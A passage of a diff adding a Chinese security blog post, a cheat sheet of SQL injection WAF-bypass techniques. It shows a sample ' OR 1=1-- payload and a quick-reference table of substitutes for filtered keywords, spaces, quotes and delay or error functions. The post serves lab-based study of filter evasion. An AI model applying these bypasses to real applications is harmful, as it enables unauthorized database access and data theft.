+<td>通过 WebSocket 发送 <code>&#39; OR 1=1--</code></td>
+<td>WAF 对 WebSocket 检测弱</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="九、快速索引表"><a href="#九、快速索引表" class="headerlink" title="九、快速索引表"></a>九、快速索引表</h2><table>
+<thead>
+<tr>
+<th>被过滤</th>
+<th>首选绕过方式</th>
+<th>备选绕过方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>and</code> &#x2F; <code>or</code></td>
+<td><code>&amp;&amp;</code> &#x2F; &#96;</td>
+<td></td>
+</tr>
+<tr>
+<td><code>=</code></td>
+<td><code>like</code></td>
+<td><code>in</code>、<code>regexp</code>、<code>between</code></td>
+</tr>
+<tr>
+<td>空格</td>
+<td><code>%0a</code></td>
+<td><code>/**/</code>、<code>()</code>、<code>%09</code></td>
+</tr>
+<tr>
+<td>单引号</td>
+<td>十六进制</td>
+<td>宽字节、Unicode</td>
+</tr>
+<tr>
+<td>逗号</td>
+<td><code>from...for...</code></td>
+<td><code>offset</code></td>
+</tr>
+<tr>
+<td><code>union</code> &#x2F; <code>select</code></td>
+<td>内联注释</td>
+<td>大小写混写、双写、十六进制</td>
+</tr>
+<tr>
+<td><code>substr</code> &#x2F; <code>mid</code></td>
+<td><code>substring</code></td>
+<td><code>left</code>、<code>right</code>、<code>lpad</code></td>
+</tr>
+<tr>
+<td><code>sleep</code></td>
+<td><code>benchmark</code></td>
+<td>笛卡尔积延时</td>
+</tr>
+<tr>
+<td>括号</td>
+<td>Unicode 编码</td>
+<td>URL 编码</td>
+</tr>
+<tr>
+<td>报错函数</td>
+<td>双查询报错</td>
+<td><code>extractvalue</code>、<code>updatexml</code></td>
+</tr>
+<tr>
+<td>延时函数</td>
+<td><code>benchmark</code></td>
+<td>笛卡尔积、<code>WAITFOR DELAY</code></td>
+</tr>
+</tbody></table>
+<hr>
+<p>绕过技术需结合目标数据库类型、安全过滤层特征和业务逻辑组合使用。建议 <strong>在合法靶场中反复练习</strong>，逐步形成系统化绕过思路。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://trifbxy.github.io">trifbxy</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://trifbxy.github.io/2026/04/01/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8/">https://trifbxy.github.io/2026/04/01/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://trifbxy.github.io" target="_blank">trifbxy's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a><a class="post-meta__tags" href="/tags/WAF%E7%BB%95%E8%BF%87/">WAF绕过</a></div><div class="post-share"><div class="social-share" data-image="https://avatars.githubusercontent.com/u/185476288?v=4&amp;size=64" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/04/01/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF/" title="SQL注入绕过思路"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">SQL注入绕过思路</div></div><div class="info-2"><div class="info-item-1"> 免责声明：    本文所涉及的所有技术、代码、Payload 及工具，仅限于在本地搭建的合法靶场环境中进行学习和研究，严禁用于任何未经授权的真实系统。   文中演示的各类绕过技术，均在严格受控的本地测试环境中完成，旨在帮助读者理解漏洞原理与防御思路。   任何因读者违反上述规定而引发的法律问题及后果，均与本文作者无关。请遵守国家法律法规，维护网络安全。   本文旨在分享技术思路，鼓励读者通过合法途径提升自身安全技能，共同维护健康的网络环境。    一、SQL 注入绕过思路介绍SQL 注入绕过的本质是攻击者利用 安全过滤层（WAF 或应用层过滤组件） 与 数据库 对同一输入的 解析差异，构造出安全过滤层无法正常检测，而数据库仍可以正常执行的 Payload，从而绕过安全检测，实现恶意 SQL 代码的注入与执行。 根本原因：  使用字符串拼接构造 SQL 语句，而非 参数化查询。 安全过滤层 缺失、配置错误或规则不完善，未能有效拦截恶意输入。 数据库 错误信息 被直接返回给前端，为渗透提供便利。   防御思路：使用参数化查询、正确配置安全过滤层、避免向用户暴露错误信息。  SQL ...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/04/01/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF/" title="SQL注入绕过思路"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-04-01</div><div class="info-item-2">SQL注入绕过思路</div></div><div class="info-2"><div class="info-item-1"> 免责声明：    本文所涉及的所有技术、代码、Payload 及工具，仅限于在本地搭建的合法靶场环境中进行学习和研究，严禁用于任何未经授权的真实系统。   文中演示的各类绕过技术，均在严格受控的本地测试环境中完成，旨在帮助读者理解漏洞原理与防御思路。   任何因读者违反上述规定而引发的法律问题及后果，均与本文作者无关。请遵守国家法律法规，维护网络安全。   本文旨在分享技术思路，鼓励读者通过合法途径提升自身安全技能，共同维护健康的网络环境。    一、SQL 注入绕过思路介绍SQL 注入绕过的本质是攻击者利用 安全过滤层（WAF 或应用层过滤组件） 与 数据库 对同一输入的 解析差异，构造出安全过滤层无法正常检测，而数据库仍可以正常执行的 Payload，从而绕过安全检测，实现恶意 SQL 代码的注入与执行。 根本原因：  使用字符串拼接构造 SQL 语句，而非 参数化查询。 安全过滤层 缺失、配置错误或规则不完善，未能有效拦截恶意输入。 数据库 错误信息 被直接返回给前端，为渗透提供便利。   防御思路：使用参数化查询、正确配置安全过滤层、避免向用户暴露错误信息。  SQL ...</div></div></div></a><a class="pagination-related" href="/2026/04/01/SQL%E6%B3%A8%E5%85%A5%E5%B8%B8%E8%A7%84%E6%80%9D%E8%B7%AF/" title="SQL注入常规思路"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-04-01</div><div class="info-item-2">SQL注入常规思路</div></div><div class="info-2"><div class="info-item-1"> 免责声明：    本文所涉及的所有技术、代码、Payload 及工具，仅限于在本地搭建的合法靶场环境中进行学习和研究，严禁用于任何未经授权的真实系统。   文中演示的 WebShell、文件写入等操作，均在严格受控的本地测试环境中完成，旨在帮助读者理解漏洞原理与防御思路。   任何因读者违反上述规定而引发的法律问题及后果，均与本文作者无关。请遵守国家法律法规，维护网络安全。   本文旨在分享技术思路，鼓励读者通过合法途径提升自身安全技能，共同维护健康的网络环境。    一、SQL 注入思路介绍SQL 注入的本质是攻击者将 SQL 代码通过 Payload 插入到 SQL 语句中，而开发者没有对用户输入进行充分的过滤和转义，导致原先的 SQL 语句 结构和语义 发生 改变。 根本原因：  开发者过于信任用户输入，没有进行充分 验证和转义。 使用字符串拼接构造 SQL 语句，而非 参数化查询。 数据库 错误信息 被直接返回给前端，为渗透提供便利。   防御思路：严格过滤输入、使用参数化查询、避免向用户暴露错误信息。  SQL 注入思路：  寻找可能与数据库产生交互的 注入点。 根据...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="https://avatars.githubusercontent.com/u/185476288?v=4&amp;size=64" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">trifbxy</div><div class="author-info-description">网安小登</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/trifbxy"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/trifbxy" target="_blank" title="GitHub"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%9F%BA%E7%A1%80%E5%85%B3%E9%94%AE%E5%AD%97%E7%BB%95%E8%BF%87"><span class="toc-number">1.</span> <span class="toc-text">一、基础关键字绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="toc-number">2.</span> <span class="toc-text">二、特殊字符绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="toc-number">2.1.</span> <span class="toc-text">1. 空格绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%AD%89%E5%8F%B7%EF%BC%88-%EF%BC%89%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.</span> <span class="toc-text">2. 等号（&#x3D;）绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-number">2.3.</span> <span class="toc-text">3. 引号绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%8B%AC%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-number">2.4.</span> <span class="toc-text">4. 括号绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E9%80%97%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-number">2.5.</span> <span class="toc-text">5. 逗号绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E4%B8%8E%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87"><span class="toc-number">3.</span> <span class="toc-text">三、联合查询与函数绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-union-select-%E7%BB%95%E8%BF%87"><span class="toc-number">3.1.</span> <span class="toc-text">1. union select 绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%87%BD%E6%95%B0%E7%AD%89%E4%BB%B7%E6%9B%BF%E6%8D%A2"><span class="toc-number">3.2.</span> <span class="toc-text">2. 函数等价替换</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%87%BD%E6%95%B0"><span class="toc-number">3.3.</span> <span class="toc-text">3. 报错注入函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E7%94%9F%E5%83%BB%E5%87%BD%E6%95%B0"><span class="toc-number">3.4.</span> <span class="toc-text">4. 生僻函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">4.</span> <span class="toc-text">四、编码绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-URL-%E7%BC%96%E7%A0%81"><span class="toc-number">4.1.</span> <span class="toc-text">1. URL 编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%8F%8C%E9%87%8D%E7%BC%96%E7%A0%81"><span class="toc-number">4.2.</span> <span class="toc-text">2. 双重编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Unicode-%E7%BC%96%E7%A0%81"><span class="toc-number">4.3.</span> <span class="toc-text">3. Unicode 编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E7%BC%96%E7%A0%81"><span class="toc-number">4.4.</span> <span class="toc-text">4. 十六进制编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-Base64-%E7%BC%96%E7%A0%81"><span class="toc-number">4.5.</span> <span class="toc-text">5. Base64 编码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E6%95%B0%E6%8D%AE%E5%BA%93%E7%89%B9%E6%80%A7%E7%BB%95%E8%BF%87"><span class="toc-number">5.</span> <span class="toc-text">五、数据库特性绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%EF%BC%88GBK%EF%BC%89"><span class="toc-number">5.1.</span> <span class="toc-text">1. 宽字节注入（GBK）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%A7%91%E5%AD%A6%E8%AE%A1%E6%95%B0%E6%B3%95%E4%B8%8E%E7%89%B9%E6%AE%8A%E6%95%B0%E5%AD%97%E8%A1%A8%E7%A4%BA"><span class="toc-number">5.2.</span> <span class="toc-text">2. 科学计数法与特殊数字表示</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%86%85%E8%81%94%E6%B3%A8%E9%87%8A"><span class="toc-number">5.3.</span> <span class="toc-text">3. 内联注释</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%89%B9%E6%9C%89%E8%AF%AD%E6%B3%95"><span class="toc-number">5.4.</span> <span class="toc-text">4. 不同数据库特有语法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD%E3%80%81HTTP-%E5%8D%8F%E8%AE%AE%E5%B1%82%E7%BB%95%E8%BF%87"><span class="toc-number">6.</span> <span class="toc-text">六、HTTP 协议层绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%83%E3%80%81%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E5%B1%82%E7%BB%95%E8%BF%87"><span class="toc-number">7.</span> <span class="toc-text">七、编程语言层绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AB%E3%80%81%E9%AB%98%E9%98%B6%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF"><span class="toc-number">8.</span> <span class="toc-text">八、高阶绕过技术</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B9%9D%E3%80%81%E5%BF%AB%E9%80%9F%E7%B4%A2%E5%BC%95%E8%A1%A8"><span class="toc-number">9.</span> <span class="toc-text">九、快速索引表</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/04/01/SQL%E6%B3%A8%E5%85%A5%E5%B8%B8%E8%A7%84%E6%80%9D%E8%B7%AF/" title="SQL注入常规思路">SQL注入常规思路</a><time datetime="2026-03-31T16:00:00.000Z" title="发表于 2026-04-01 00:00:00">2026-04-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/04/01/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF/" title="SQL注入绕过思路">SQL注入绕过思路</a><time datetime="2026-03-31T16:00:00.000Z" title="发表于 2026-04-01 00:00:00">2026-04-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/04/01/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8/" title="SQL注入绕过思路">SQL注入绕过思路</a><time datetime="2026-03-31T16:00:00.000Z" title="发表于 2026-04-01 00:00:00">2026-04-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/03/27/xss-labs%E9%9D%B6%E5%9C%BA/" title="xss-labs靶场">xss-labs靶场</a><time datetime="2026-03-27T13:56:02.000Z" title="发表于 2026-03-27 21:56:02">2026-03-27</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2026 By trifbxy</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.4</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4"></script><script src="/js/main.js?v=5.5.4"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
